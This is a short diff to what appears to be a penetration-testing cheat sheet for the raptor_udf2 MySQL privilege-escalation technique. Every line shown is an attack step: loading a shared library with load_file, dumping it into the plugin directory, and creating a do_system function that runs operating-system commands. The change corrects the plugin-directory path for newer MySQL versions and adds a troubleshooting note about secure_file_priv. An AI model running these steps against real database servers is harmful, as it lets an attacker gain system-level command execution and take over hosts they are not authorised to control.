@@ -25,8 +25,8 @@ mysql -u '<Username>' -p'<Password>' mysql
 Inside mysql:
 create table pe(line blob);
 insert into pe values(load_file('/tmp/raptor_udf2.so'));
-select * from pe into dumpfile '/usr/lib/raptor_udf2.so';
-- [ ] On 5.1 or later, the @@plugin_dir path in place of /usr/lib, such as /usr/lib/mysql/plugin/raptor_udf2.so
+select * from pe into dumpfile 'THE-PLUGIN-DIR/raptor_udf2.so';
+- [ ] THE-PLUGIN-DIR is @@plugin_dir, such as /usr/lib/mysql/plugin; /usr/lib only before 5.1
 - [ ] load_file gives NULL: the file is not readable by mysqld, or not where secure_file_priv allows
 create function do_system returns integer soname 'raptor_udf2.so';
 select * from mysql.func;
